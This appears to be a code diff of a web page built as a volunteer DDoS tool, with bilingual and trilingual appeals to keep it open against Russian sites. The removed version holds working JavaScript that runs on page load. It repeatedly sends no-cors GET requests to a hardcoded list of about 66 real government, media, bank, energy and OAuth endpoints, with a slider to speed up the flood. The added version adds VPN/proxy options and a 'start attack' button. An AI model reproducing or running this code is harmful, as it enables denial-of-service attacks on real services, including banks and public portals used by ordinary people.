@@ -1,232 +1,54 @@
 <!DOCTYPE html>
 <html lang="en">
 	<head>
-		<meta charset="utf-8" />
-		<title>russia MUST BE STOPPED!</title>
+		<meta charset="UTF-8" />
+		<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		<link rel="stylesheet" href="css/style.css" />
+		<title>DDOS Russian web site</title>
 	</head>
-	<style>
-		#stats tr {
-			height: 40px;
-			overflow: hidden;
-		}
-		#stats td {
-			height: 35px;
-		}
-		.err {
-			background-color: rgb(247, 58, 58);
-		}
-		.suc {
-			background-color: rgb(135, 247, 71);
-		}
-		table,
-		tr {
-			width: 100%;
-		}
-		td {
-			width: 30%;
-			padding: 5px 10px;
-		}
-		.wraper {
-			position: fixed;
-			left: 0;
-			bottom: 0;
-			background-color: rgba(174, 219, 253, 0.83);
-			padding: 20px 30px;
-			width: 100%;
-		}
-		.wraper input {
-			display: block;
-			margin: 0 auto;
-			width: 90%;
-			cursor: pointer;
-		}
-		.text-wraper {
-			font-family: sans-serif;
-			font-size: 18px;
-			color: rgb(55, 54, 54);
-		}
-		.value-text {
-			font-size: 20px;
-			text-transform: uppercase;
-			font-weight: 400;
-		}
-		#inner-value {
-			font-size: 22px;
-			font-weight: bold;
-		}
-	</style>
 	<body>
-		<h1>Russia MUST BE STOPPED! Help Ukraine WIN!</h1>
-		<table width="100%">
-			<tr>
-				<td width="30%">
-					<h3>English version</h3>
-					<p>The "official" news in the Russian Federation is mostly fake and we believe it is better to shut them down and let people switch to trustful news.</p>
-					<p>Please, just open this page and let it be open on your devices. It will flood the Russian propaganda websites and pose a huge load on their infrastructure.</p>
-					<p>Your browser will be slow. It's ok, don't worry and keep it run.</p>
-					<p>A small contribution from each of us will save Ukraine 🙏</p>
-				</td>
-				<td width="30%">
-					<h3>Русская версия</h3>
-					<p>«Официальные» новости в РФ полны пропаганды и транслируют лживую информацию о событиях на Украине. Мы считаем, что лучше их закрыть и позволить людям переключиться на достоверные новости.</p>
-					<p>Пожалуйста, откройте эту страницу на ваших устройствах. Это зальёт российские пропагандистские сайты запросами и создаст огромную нагрузку на их инфраструктуру.</p>
-					<p>Ваш браузер будет работать медленно. Все в порядке, не волнуйтесь и держите его открытым.</p>
-					<p>Небольшой вклад каждого из нас спасет Украину 🙏</p>
-				</td>
-				<td width="30%">
-					<h3>Українська версія</h3>
-					<p>«Офіційні» новини в РФ сповнені пропаганди та транслюють брехливу інформацію про події в Україні. Ми вважаємо, що краще їх закрити та дозволити людям переключитися на достовірні новини.</p>
-					<p>Будь ласка, відкрийте цю сторінку на вашому пристрої. Це закидає російські пропагандистські сайти запитами та створить величезне навантаження на їхню інфраструктуру.</p>
-					<p>Ваш браузер працюватиме повільно. Все гаразд, не хвилюйтеся та тримайте його відкритим.</p>
-					<p>Невеликий внесок кожного з нас врятує Україну 🙏</p>
-				</td>
-			</tr>
-		</table>
-		<div class="wraper">
-			<div class="text-wraper">
-				<p>
-					міняючи значення повзунка ти можеш міняти частоту запитів на сервер за одну секунду, чим менше значення повзунка тим менший інтервал часу між запитиами і таким чином ти створюєш більше
-					навантаження на ворожі сервери, за умовчуванням запити відправляються кожні 500 мілісекунд
-				</p>
-				<p class="value-text">Інтервал між запитами <span id="inner-value"></span> мілісекунд</p>
+		<input type="checkbox" class="light-mode-checkbox" id="lightModeCheckBox" />
+		<section class="info-section">
+			<div class="container">
+				<div class="browser-msg hide">
+					<p class="msg-text" id="msgText"></p>
+				</div>
 			</div>
-			<input type="range" min="100" max="1000" step="10" value="500" id="range" />
-		</div>
-		<div>
-			<table>
-				<tr>
-					<td>Сайт</td>
-					<td>Кількість Успішних запитів</td>
-					<td>Кількість помилок</td>
-				</tr>
-			</table>
-			<table id="stats"></table>
-		</div>
-		<script>
-			let stats = document.querySelector("#stats");
-			let range = document.querySelector("#range");
-			let innerRangeValue = document.querySelector("#inner-value");
-			let rangeValue = range.value;
-			let statsData = [];
-			let table = "";
-			let targets = [
-				"https://lenta.ru/",
-				"https://ria.ru/",
-				"https://ria.ru/lenta/",
-				"https://www.rbc.ru/",
-				"https://www.rt.com/",
-				"http://kremlin.ru/",
-				"http://en.kremlin.ru/",
-				"https://smotrim.ru/",
-				"https://tass.ru/",
-				"https://tvzvezda.ru/",
-				"https://vsoloviev.ru/",
-				"https://www.1tv.ru/",
-				"https://www.vesti.ru/",
-				"https://online.sberbank.ru/",
-				"https://sberbank.ru/",
-				"https://zakupki.gov.ru/",
-				"https://www.gosuslugi.ru/",
-				"https://er.ru/",
-				"https://www.rzd.ru/",
-				"https://rzdlog.ru/",
-				"https://vgtrk.ru/",
-				"https://www.interfax.ru/",
-				"https://www.mos.ru/uslugi/",
-				"http://government.ru/",
-				"https://mil.ru/",
-				"https://www.nalog.gov.ru/",
-				"https://customs.gov.ru/",
-				"https://pfr.gov.ru/",
-				"https://rkn.gov.ru/",
-				"https://www.gazprombank.ru/",
-				"https://www.vtb.ru/",
-				"https://www.gazprom.ru/",
-				"https://lukoil.ru",
-				"https://magnit.ru/",
-				"https://www.nornickel.com/",
-				"https://www.surgutneftegas.ru/",
-				"https://www.tatneft.ru/",
-				"https://www.evraz.com/ru/",
-				"https://nlmk.com/",
-				"https://www.sibur.ru/",
-				"https://www.severstal.com/",
-				"https://www.metalloinvest.com/",
-				"https://nangs.org/",
-				"https://rmk-group.ru/ru/",
-				"https://www.tmk-group.ru/",
-				"https://yandex.ru/",
-				"https://yandex.by/",
-				"https://www.polymetalinternational.com/ru/",
-				"https://www.uralkali.com/ru/",
-				"https://www.eurosib.ru/",
-				"https://omk.ru/",
-				"https://mail.rkn.gov.ru/",
-				"https://cloud.rkn.gov.ru/",
-				"https://mvd.gov.ru/",
-				"https://pwd.wto.economy.gov.ru/",
-				"https://stroi.gov.ru/",
-				"https://proverki.gov.ru/",
-				"https://www.gazeta.ru/",
-				"https://www.crimea.kp.ru/",
-				"https://www.kommersant.ru/",
-				"https://riafan.ru/",
-				"https://www.mk.ru/",
-				"https://api.sberbank.ru/prod/tokens/v2/oauth",
-				"https://api.sberbank.ru/prod/tokens/v2/oidc",
-				"https://www.vedomosti.ru/",
-				"https://sputnik.by/",
-			];
-			innerRangeValue.innerText = rangeValue;
-			range.addEventListener("change", function (e) {
-				sendQuery(targets);
-				rangeValue = +this.value;
-				innerRangeValue.innerText = rangeValue;
-			});
-			targets.forEach(function (k) {
-				statsData.push({ host: k, err: false, queryNum: 0, errorNum: 0 });
-			});
-			function sendQuery(a) {
-				// відправка запитів на раніше отримані хости
-				let data = a;
-				setInterval(function () {
-					data.forEach(function (k, i) {
-						fetch(k, {
-							method: "GET",
-							mode: "no-cors",
-							headers: {
-								"Referrer-Policy": "no-referrer",
-							},
-						})
-							.then(function (responce) {
-								statsData[i].err = false;
-								statsData[i].queryNum++;
-							})
-							.catch(function (error) {
-								statsData[i].err = true;
-								statsData[i].errorNum++;
-							});
-					});
-					drawStats(statsData);
-					console.warn(rangeValue);
-				}, rangeValue);
-			}
-			function drawStats(a) {
-				// показ статистики відправки запитів на хости
-				a.forEach(function (k) {
-					let classVal;
-					if (k.err === true) {
-						classVal = "err";
-					} else {
-						classVal = "suc";
-					}
-					let a = `<tr class=${classVal}><td>${k.host.substring(0, 40)}</td><td>${k.queryNum}</td><td>${k.errorNum}</td>`;
-					table = table.concat("", a);
-				});
-				stats.innerHTML = table;
-				table = "";
-			}
-			sendQuery(targets);
-		</script>
+		</section>
+		<section class="conection-setings">
+			<h2 class="main-title">Налаштування підключення</h2>
+			<div class="container flex-container">
+				<div class="block">
+					<h3 class="main-sub-title">Підключитися до VPN</h3>
+					<buton class="btn-connect" id="btnVpn" data-conection-type="Vpn" data-conection-list="js/vpn.json">Підключитися</buton>
+				</div>
+				<div class="block">
+					<h3 class="main-sub-title">Підключитися до Proxy</h3>
+					<buton class="btn-connect" id="btnProxy" data-conection-type="proxy" data-conection-list="js/proxy.json">Підключитися</buton>
+				</div>
+				<div class="block">
+					<h3 class="main-sub-title">Інформація про ваше підключення</h3>
+					<div class="conection-data" id="DataContainer"></div>
+				</div>
+			</div>
+		</section>
+		<section class="atack">
+			<div class="container">
+				<h2 class="main-title">інформація про атаку</h2>
+				<ul class="targets-list" id="targetContainer">
+					<li class="target-item">
+						<div class="data-link">адреса жертви</div>
+						<div class="data-sum">загалька кількість запитів на жертву</div>
+						<div class="data-suc suc">кількість успішних запитів</div>
+						<div class="data-err err">кількість помилкових запитів</div>
+					</li>
+					<div id="dataWraper">
+						<button id="startAtackBtn" class="start-btn">Розпочати атаку</button>
+					</div>
+				</ul>
+			</div>
+		</section>
+		<script src="js/query.js"></script>
 	</body>
 </html>
